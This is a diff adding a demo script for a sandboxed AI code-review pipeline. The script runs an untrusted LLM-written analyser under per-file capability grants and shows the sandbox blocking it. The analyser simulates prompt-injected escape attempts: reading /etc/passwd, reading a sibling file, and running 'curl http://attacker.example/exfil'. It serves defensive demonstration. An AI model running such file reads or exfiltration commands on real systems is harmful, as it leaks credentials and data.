@@ -1,0 +1,94 @@
+# Powerhouse — AI code-review pipeline with per-file capability sandboxing.
+#
+# An LLM has written an "analyser" routine we want to run against every
+# file in a source tree.  We don't trust it: it may be prompt-injected,
+# it may have bugs, it may try to exfiltrate.
+#
+# Defence: each file is analysed inside its own `grant` block with
+#   - no external commands at all      (exec: [:])
+#   - read access to exactly one file  (fs: [read: [<that file>]])
+#   - no network
+# Anything else is denied in-process.
+#
+# The demo fabricates a small "repo", runs the analysis in parallel, and
+# watches grant block three prompt-injected escape attempts per worker
+# while the legitimate static analysis still completes.  Self-cleaning.
+
+let ws = '/tmp/ral-ai-review'
+mkdir -p $ws
+
+# ------ fabricate a fake repo --------------------------------------------
+echo 'import os'                          >  "$ws/clean.py"
+echo 'def greet(name):'                   >> "$ws/clean.py"
+echo '    return f"hello {name}"'         >> "$ws/clean.py"
+
+echo 'import json, sys'                   >  "$ws/parse.py"
+echo 'def parse(s):'                      >> "$ws/parse.py"
+echo '    return json.loads(s)'           >> "$ws/parse.py"
+echo 'def run():'                         >> "$ws/parse.py"
+echo '    exec(input())   # suspect'      >> "$ws/parse.py"
+
+echo 'import subprocess'                  >  "$ws/risky.py"
+echo 'def run(cmd):'                      >> "$ws/risky.py"
+echo '    eval(cmd)'                      >> "$ws/risky.py"
+echo '    subprocess.call(cmd, shell=1)'  >> "$ws/risky.py"
+
+echo 'def hash(x): return x * 2654435761' >  "$ws/hash.py"
+
+# ------ the (untrusted) analyser, pure -----------------------------------
+let analyse = { |path|
+    let content = read-file $path
+    let lines   = read-lines $content
+    let imports = filter { |l| !{match '^(import|from) ' $l} } $lines
+    let suspect = filter { |l| !{match '(eval|exec|subprocess)' $l} } $lines
+
+    # Three prompt-injected escape attempts.  Each is a real capability
+    # violation; grant blocks each one in-process.
+    let esc_fs_secret  = try { read-file '/etc/passwd';                 return true } { |_| return false }
+    let esc_fs_sibling = try { read-file '/tmp/ral-ai-review/risky.py'; return true } { |_| return false }
+    let esc_exec       = try { curl http://attacker.example/exfil;      return true } { |_| return false }
+
+    let blocked = [fs_secret: $[not $esc_fs_secret], fs_neighbor: $[not $esc_fs_sibling], exec: $[not $esc_exec]]
+
+    return [file: !{base $path}, lines: !{length $lines}, bytes: !{length $content}, imports: $imports, suspicious: $suspect, blocked: $blocked]
+}
+
+# ------ fan out: one spawn per file, each under its own grant ------------
+let files = find $ws -name '*.py' | from-lines
+let jobs  = map { |p|
+    spawn {
+        grant [exec: [:], fs: [read: [$p]]] {
+            !{analyse $p}
+        }
+    }
+} $files
+let reports = map { |h| await $h } $jobs
+
+# ------ aggregate --------------------------------------------------------
+let tot_lines = fold { |a r| return $[$a + $r[lines]] } 0 $reports
+let tot_bytes = fold { |a r| return $[$a + $r[bytes]] } 0 $reports
+let tot_sus   = fold { |a r| return $[$a + !{length $r[suspicious]}] } 0 $reports
+let all_fs_s  = filter { |r| return $r[blocked][fs_secret] }   $reports
+let all_fs_n  = filter { |r| return $r[blocked][fs_neighbor] } $reports
+let all_x     = filter { |r| return $r[blocked][exec] }        $reports
+
+echo ''
+echo '=== per-file analysis ==='
+for $reports { |r|
+    let nimp = length $r[imports]
+    let nsus = length $r[suspicious]
+    echo "  $r[file]  lines=$r[lines]  bytes=$r[bytes]  imports=$nimp  suspicious=$nsus"
+}
+
+echo ''
+echo '=== grant enforcement ==='
+echo "  read /etc/passwd blocked in:   !{length $all_fs_s}/!{length $reports} workers"
+echo "  read sibling file blocked in:  !{length $all_fs_n}/!{length $reports} workers"
+echo "  exec curl blocked in:          !{length $all_x}/!{length $reports} workers"
+
+echo ''
+echo '=== corpus totals ==='
+echo "  $tot_lines lines, $tot_bytes bytes, $tot_sus suspicious call sites"
+echo "  across !{length $reports} files"
+
+rm -rf $ws
